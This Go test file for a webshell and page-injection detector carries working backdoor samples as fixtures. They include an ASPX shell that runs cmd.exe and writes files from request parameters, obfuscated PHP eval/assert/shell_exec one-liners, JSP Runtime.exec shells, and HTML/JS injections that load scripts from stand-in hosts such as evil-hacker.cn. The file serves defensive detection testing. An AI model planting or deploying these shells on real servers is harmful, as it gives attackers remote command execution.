package detector

import "testing"

// 案例样本：Hide-S6.aspx 反编译出来的真实木马逻辑（截取片段）。
const sampleTrojan = `private void @__Render__control1(...) {
    this.WriteUTF8ResourceString(@__w, 0, 16825, false);
    string w=Request["w"];string t=Request["t"];string c=Request["c"];
    if(!string.IsNullOrEmpty(w) && t!=null){
        byte[] bb=Convert.FromBase64String(t);
        System.IO.File.WriteAllText(Server.MapPath(w),System.Text.Encoding.UTF8.GetString(bb));
        Response.Write("WROTE "+w);
    } else if(!string.IsNullOrEmpty(c)){
        System.Diagnostics.ProcessStartInfo si=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+c);
        si.RedirectStandardOutput=true; si.RedirectStandardError=true;
        si.UseShellExecute=false; si.CreateNoWindow=true;
        System.Diagnostics.Process p=System.Diagnostics.Process.Start(si);
        Response.Write("<pre>"+Server.HtmlEncode(p.StandardOutput.ReadToEnd())+"</pre>");
    }
}
this.Server.ScriptTimeout = 30000000;
@__ctrl.EnableViewStateMac = false;
@__ctrl.EnableEventValidation = false;`

const normalPage = `<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Show.aspx.cs" %>
<html><head><title>帮助中心</title></head>
<body><div class="help-content">常见问题解答</div></body></html>`

const horsePage = `<html><body>正常内容
<iframe src="http://evil-hacker.cn/payload.html" width="0" height="0"></iframe>
<script src="http://evil-hacker.cn/x.js"></script>
</body></html>`

func TestDetectTrojanSample(t *testing.T) {
	d := New(6, nil, nil)
	res := d.Detect(sampleTrojan, 2048)
	if res.Clean {
		t.Fatalf("木马样本未被检出, score=%d hits=%v", res.Score, res.Hits)
	}
	if res.Score < d.Threshold() {
		t.Fatalf("木马样本评分 %d 低于阈值 %d", res.Score, d.Threshold())
	}
	if res.Hits[0].Kind != KindWebshell && res.Hits[0].Kind != KindHorse {
		t.Fatalf("类别异常: %s", res.Hits[0].Kind)
	}
	t.Logf("样本检出: score=%d 规则=%v sha=%s", res.Score, res.Hits, res.SHA256[:16])
}

func TestDetectNormalPage(t *testing.T) {
	d := New(6, nil, nil)
	res := d.Detect(normalPage, 256)
	if !res.Clean || res.Score >= d.Threshold() {
		t.Fatalf("正常页面被误报: score=%d hits=%v", res.Score, res.Hits)
	}
}

func TestDetectHorse(t *testing.T) {
	d := New(6, nil, nil)
	res := d.Detect(horsePage, 256)
	if res.Clean || res.Score < d.Threshold() {
		t.Fatalf("挂马样本未达阈值: score=%d hits=%v", res.Score, res.Hits)
	}
	hasHorse := false
	for _, h := range res.Hits {
		if h.Kind == KindHorse {
			hasHorse = true
		}
	}
	if !hasHorse {
		t.Fatalf("挂马样本未识别为挂马类别: %v", res.Hits)
	}
}

func TestWhitelistDomain(t *testing.T) {
	content := `<iframe src="https://cdn.bootcss.com/lib.js"></iframe>`
	d := New(6, []string{"cdn.bootcss.com"}, nil)
	res := d.Detect(content, 64)
	if !res.Clean {
		t.Fatalf("白名单域名仍被扣分: score=%d", res.Score)
	}
}

const phpTrojan = `<?php
$pwd = "abc123";
if ($_POST['pass'] == $pwd) {
    @eval($_POST['cmd']);
}
?>`
// 注：真实一句话里 $pwd 也来自请求，这里演示 eval($_POST) 强特征

const phpTrojan2 = `<?php
$f = $_GET['f'];
$cmd = $_REQUEST['c'];
echo shell_exec($cmd);
file_put_contents($f, $_POST['data']);
?>`

const jspTrojan = `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line; while ((line = br.readLine()) != null) out.println(line);
%>`

func TestDetectPhpTrojan(t *testing.T) {
	d := New(6, nil, nil)
	for name, sample := range map[string]string{"一句话": phpTrojan, "变形后门": phpTrojan2} {
		res := d.Detect(sample, 256)
		if res.Clean || res.Score < d.Threshold() {
			t.Fatalf("PHP木马(%s)未检出: score=%d hits=%v", name, res.Score, res.Hits)
		}
		t.Logf("PHP木马(%s): score=%d 规则=%d条", name, res.Score, len(res.Hits))
	}
}

// 小马变种写法清单（实战常见变形）
func TestDetectPhpVariants(t *testing.T) {
	d := New(6, nil, nil)
	variants := map[string]string{
		"字符串assert中转":  `$f = 'assert'; $f($_POST['x']);`,
		"用户输入赋值后调用":    `$c = $_GET['c']; $c($_POST['p']);`,
		"反引号执行":        "`{$_REQUEST['cmd']}`;",
		"extract变量覆盖":  `extract($_POST); $a($_REQUEST['f']);`,
		"system+base64": `echo shell_exec(base64_decode($_POST['c']));`,
		"assert+chr链":   `assert(chr(101).chr(118).chr(97).chr(108).($_POST['x']));`,
		"字符串拼接函数名":     `$fn = "sh"."ell_exec"; $fn($_POST['c']);`,
		"hex混淆eval":    `eval("\x61\x73\x73\x65\x72\x74\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29");`,
		"php://input执行": `eval(file_get_contents("php://input"));`,
		"无字母数字自增马":     `$_[]=@_+1; $__=[]; $___=@$__[$__]...`,
	}
	for name, sample := range variants {
		res := d.Detect(sample, 256)
		if res.Clean || res.Score < d.Threshold() {
			t.Errorf("变种未达标(%s): score=%d hits=%v", name, res.Score, res.Hits)
		} else {
			t.Logf("变种检出(%s): score=%d", name, res.Score)
		}
	}
}

func TestDetectAspxVariants(t *testing.T) {
	d := New(6, nil, nil)
	variants := map[string]string{
		"JScript.NET一句话":  `<script runat="server" language="JScript">eval(Request.Item['x'], 'unsafe');</script>`,
		"execute+request": `<% execute request("x") %>`,
		"拆分eval防替换":       `<% ev al request("x") %>`,
		"反射调用变形":          `Type t = typeof(Process); var m = t.GetMethod("Start"); m.Invoke(null, new object[]{ Request["cmd"] });`,
	}
	for name, sample := range variants {
		res := d.Detect(sample, 256)
		if res.Clean || res.Score < d.Threshold() {
			t.Errorf("ASPX变种未达标(%s): score=%d hits=%v", name, res.Score, res.Hits)
		} else {
			t.Logf("ASPX变种检出(%s): score=%d", name, res.Score)
		}
	}
}

func TestDetectJspVariants(t *testing.T) {
	d := New(6, nil, nil)
	variants := map[string]string{
		"反射Runtime":   `<% Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(null, request.getParameter("c")); %>`,
		"Header传参执行":  `<% String c = request.getHeader("X-Cmd"); Process p = Runtime.getRuntime().exec(c); %>`,
		"EL表达式注入":     `${Runtime.getRuntime().exec(param.cmd)}`,
		"ScriptEngine马": `<% new ScriptEngineManager().getEngineByName("js").eval(request.getParameter("s")); %>`,
	}
	for name, sample := range variants {
		res := d.Detect(sample, 256)
		if res.Clean || res.Score < d.Threshold() {
			t.Errorf("JSP变种未达标(%s): score=%d hits=%v", name, res.Score, res.Hits)
		} else {
			t.Logf("JSP变种检出(%s): score=%d", name, res.Score)
		}
	}
}

func TestDetectHorseVariants(t *testing.T) {
	d := New(6, nil, nil)
	variants := map[string]string{
		"srcdoc挂马":    `<iframe srcdoc="<script src='http://evil.cn/x.js'></script>"></iframe>`,
		"atob注入":      `document.write(atob('PHNjcmlwdCBzcmM9J2h0dHA6Ly9ldmlsLmNuL3guanMnPjwvc2NyaXB0Pg=='));`,
		"meta跳转劫持":    `<meta http-equiv="refresh" content="0;url=http://evil-hacker.cn/">`,
		"base64内嵌页":   `<iframe src="data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+"></iframe>`,
		"延迟eval执行":    `setTimeout("eval(atob(location.hash.substr(1)))", 100);`,
	}
	for name, sample := range variants {
		res := d.Detect(sample, 256)
		if res.Clean || res.Score < d.Threshold() {
			t.Errorf("挂马变种未达标(%s): score=%d hits=%v", name, res.Score, res.Hits)
		} else {
			t.Logf("挂马变种检出(%s): score=%d", name, res.Score)
		}
	}
}

// 变种规则不得误伤正常业务代码
func TestVariantsNoFalsePositive(t *testing.T) {
	d := New(6, nil, nil)
	normals := []string{
		`echo "hello " . "world" . $_GET['id'];`,                     // 字符串拼接输出用户输入
		`$tpl = "user_" . $name . ".html"; include $tpl;`,            // 含 include + 拼接（无用户请求超全局）
		`const data = "\x48\x65\x6c\x6c\x6f";`,                       // hex 常量（无 eval 组合）
		`setTimeout(function(){ alert("ok"); }, 100);`,               // setTimeout 正常用法
		`document.write("<div>欢迎</div>");`,                           // 正常 DOM 写入
		`<meta http-equiv="refresh" content="5;url=/login.html">`,    // 站内跳转
		`var s = atob("aGVsbG8="); console.log(s);`,                  // atob 解码正常使用
		`Class.forName("com.mysql.jdbc.Driver");`,                    // JSP 正常加载驱动
		`Process p = Runtime.getRuntime().exec("ping 127.0.0.1");`,   // 固定命令无用户输入
		`$total = array_map('intval', $ids);`,                        // 回调正常用法(无用户输入源)
	}
	for i, sample := range normals {
		res := d.Detect(sample, 128)
		if !res.Clean && res.Score >= d.Threshold() {
			t.Errorf("正常代码被误报[%d]: score=%d hits=%v", i, res.Score, res.Hits)
		}
	}
}

func TestDetectJspTrojan(t *testing.T) {
	d := New(6, nil, nil)
	res := d.Detect(jspTrojan, 256)
	if res.Clean || res.Score < d.Threshold() {
		t.Fatalf("JSP木马未检出: score=%d hits=%v", res.Score, res.Hits)
	}
	if res.Hits[0].Kind != KindWebshell {
		t.Fatalf("JSP木马类别异常: %s", res.Hits[0].Kind)
	}
	t.Logf("JSP木马: score=%d 规则=%v", res.Score, res.Hits)
}
